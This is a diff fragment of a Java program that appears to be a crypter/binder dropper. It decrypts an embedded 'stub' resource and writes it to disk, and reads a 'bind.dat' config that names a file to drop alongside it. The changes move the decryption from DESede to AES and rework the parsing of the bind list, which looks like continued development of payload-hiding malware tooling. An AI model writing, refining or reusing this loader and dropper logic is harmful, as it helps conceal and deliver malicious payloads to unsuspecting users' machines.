@@ -108,9 +108,9 @@ public class Main {
 			}
 
 			FileOutputStream out = new FileOutputStream(file);
-			Cipher dcipher = Cipher.getInstance("DESede");
+			Cipher dcipher = Cipher.getInstance("AES");
 
-			Key keySpec = new SecretKeySpec(encryptionKey.getBytes(), "DESede");
+			Key keySpec = new SecretKeySpec(encryptionKey.getBytes("UTF-8"), "AES");
 			dcipher.init(Cipher.DECRYPT_MODE, keySpec);
 			stubInput = new CipherInputStream(stubInput, dcipher);
 			int numRead = 0;
@@ -126,12 +126,11 @@ public class Main {
 			String javapath = System.getProperty("java.home") + "\\bin\\java";
 
 			if (Main.class.getResourceAsStream("/bind.dat") != null) {
-				String[] binds = readString(Main.class.getResourceAsStream("/bind.dat")).split("\n");
+				String[] binds = readString(Main.class.getResourceAsStream("/bind.dat")).split(",");
 
-				String dropp = decode(binds[0]).trim();
-				String name1 = decode(binds[1]).trim();
+				String dropp = decode(binds[0].trim());
+				String name1 = decode(binds[1].trim());
 				String ext = decode(binds[2].trim());
-				String inside = decode(binds[3].trim());
 
 				File dropfile = null;
 
@@ -156,7 +155,7 @@ public class Main {
 				}
 
 				FileOutputStream fos = new FileOutputStream(dropfile);
-				InputStream rin = Main.class.getResourceAsStream(inside);
+				InputStream rin = Main.class.getResourceAsStream("/" + name1);
 
 				int read;
 
